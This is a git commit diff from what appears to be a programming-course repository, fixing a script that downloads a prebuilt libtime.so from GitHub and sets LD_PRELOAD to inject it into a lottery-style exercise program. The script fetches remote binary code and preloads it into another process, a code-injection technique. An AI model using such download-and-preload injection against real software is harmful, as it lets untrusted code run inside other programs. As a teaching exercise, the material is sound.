6bf79a5ae6668f51d07f4a667ba0bf5cd626d7f6
joekariuki3 <joekariuki3@gmail.com>
2023-06-19 23:10:54 +0300

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget https://github.com/joekariuki3/alx-low_level_programming/blob/master/0x18-dynamic_libraries/libtime.so libtime.so
+wget https://raw.githubusercontent.com/joekariuki3/alx-low_level_programming/master/0x18-dynamic_libraries/libtime.so libtime.so
 export LD_PRELOAD="./libtime.so"
